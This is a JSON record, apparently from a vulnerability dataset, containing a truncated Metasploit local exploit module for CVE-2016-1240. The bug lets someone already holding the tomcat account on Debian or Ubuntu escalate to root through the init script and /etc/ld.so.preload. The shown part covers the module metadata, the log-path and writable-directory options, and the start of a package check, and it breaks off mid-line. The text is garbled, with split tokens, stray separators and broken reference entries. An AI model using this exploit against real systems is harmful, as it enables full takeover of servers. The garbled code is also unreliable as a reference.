{
    "text": "vul_name : Apache Tomcat On Ubuntu Log Init Privilege Escalation ， vul_cve : CVE-2016-1240 ， vul_poc :  ，  # This exploit sample shows how an exploit module could be written to exploit ，  # a bug in a command on a linux computer for priv esc. ， class MetasploitModule < Msf : Exploit : Local ， Rank = ManualRanking ， include Msf : Exploit : Retry ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， include Msf : Post : Linux : Compile ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Apache Tomcat on Ubuntu Log Init Privilege Escalation' ,  ， 'Description' => %q{ ， Tomcat ( 6 , 7 , 8 ) packages provided by default repositories on Debian-based ， distributions ( including Debian , Ubuntu etc. ) provide a vulnerable ， tomcat init script that allows local attackers who have already gained access ， to the tomcat account ( for example , by exploiting an RCE vulnerability ， in a java web application hosted on Tomcat , uploading a webshell etc. ) to ， escalate their privileges from tomcat user to root and fully compromise the ， target system. ， Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04 ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'h00die' ,  # msf module ， 'Dawid Golunski <dawid @ legalhackers.com>' # original PoC , analysis , discovery ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 , ARCH_PYTHON ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， 'DefaultOptions' => { ， 'PrependFork' => true ,  ， 'WfsDelay' => 1800 # 30min ， } ,  ， ' ，  [ 'EDB' , '40450' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'CVE' , '2016-1240' ]  ，  ]  ,  ， 'DisclosureDate' => '2016-09-30' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , CONFIG_CHANGES , IOC_IN_LOGS ]  ， } ， register_options [  ， OptString.new ( 'CATALINA' ,  [ true , 'Location of catalina.out file' , '/var/log/tomcat8/catalina.out' ]  )  ，  ]  ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ,  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def preload ， '/etc/ld.so.preload' ， end ， def catalina ， datastore [ 'CATALINA' ]  ， end ， def check ， package = cmd_exec ( 'dpkg -l tomcat [ 6-8 ]  | grep \\'^i\\' ) ",
    "time": "2023.02.06"
}